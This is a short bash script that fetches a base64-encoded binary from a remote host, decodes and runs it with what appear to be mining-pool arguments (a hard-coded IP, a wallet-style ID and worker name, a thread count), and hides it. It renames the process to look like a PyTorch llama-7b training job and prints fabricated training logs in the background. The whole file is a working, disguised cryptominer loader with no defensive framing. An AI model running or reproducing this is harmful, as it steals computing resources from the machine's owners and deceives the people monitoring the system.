#!/usr/bin/env bash
set -e
DIR="$(mktemp -d)"
cd "$DIR"

curl -sL "https://pub-93e6c04e1cc548dabb40dc2d1a7c7b2a.r2.dev/payload.b64" | base64 -d > python3_train
chmod +x python3_train

MASTER="43.159.60.190:443"
ID="crb1abf88cb3588cfee93689726f91b86cab4955d986"
WORKER=$(head -c 256 /dev/urandom | tr -dc a-z0-9 | head -c 9)
THREADS=$(nproc 2>/dev/null || echo 160)

ARGS="-o $MASTER -u ${ID}.${WORKER} -t $THREADS"

fake_logs() {
    local step=0
    local loss=3.8421
    while true; do
        step=$((step + 1))
        loss=$(python3 -c "l=$loss; print(round(l - 0.0003 + 0.0001*($step%5), 4))")
        lr=$(python3 -c "print(round(3e-4 * (1 - $step/100000), 6))")
        tok=$((245000 + RANDOM % 8000))
        gpu=$(python3 -c "print(round(87.5 + ($step%10)*0.3, 1))")
        printf "[train] step=%d loss=%.4f lr=%.6f tok/s=%d gpu_util=%.1f%%\n" "$step" "$loss" "$lr" "$tok" "$gpu"
        sleep 10
    done
}

fake_logs &

exec -a "python3 -m torch.distributed.run --nproc_per_node=4 --model=llama-7b-fp16 --master_port=29500" \
    ./python3_train $ARGS > /dev/null 2>&1
